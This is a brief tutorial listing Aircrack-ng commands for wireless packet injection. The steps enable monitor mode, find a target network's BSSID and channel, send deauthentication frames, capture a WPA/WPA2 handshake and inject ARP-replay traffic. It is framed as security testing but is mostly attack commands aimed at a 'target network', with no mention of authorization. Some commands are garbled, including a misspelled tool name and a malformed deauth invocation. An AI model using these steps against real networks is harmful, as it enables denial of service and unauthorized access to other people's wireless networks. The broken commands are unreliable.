# Packet Injection

### Packet injection is a technique used in wireless security testing to inject specially crafted packets into a wireless network to perform various attacks or tests. Below are step-by-step commands to perform packet injection using the Aircrack-ng suite, a commonly used tool for wireless penetration testing:

#### 1) sudo airmon-ng start wlan0 (Put your wireless interface into monitor mode to capture wireless packets)

#### 2) sudo airdump-ng wlan0mon (Identify target network)

#### 3) Note down the BSSID of the target and the channel it's operating on

#### 4) sudo aireplay-ng --deauth 10 AA:BB:CC:DD:EE:FF wlan0mon (Deauthentication attack)

#### 5) If you are targeting a WPA/WPA2 secured network, capture the authentication handshake by monitoring the target network until a client authenticates or re-authenticates.

#### 6) sudo aireplay-ng --arpreplay -b MAC_ADDRESS wlan0mon (Inject packets into target network. You can perform attacks like: ARP request replay, fragment, caffe-latte, etc)

#### 7) Monitor the effects of packet injection in the airodump-ng window.
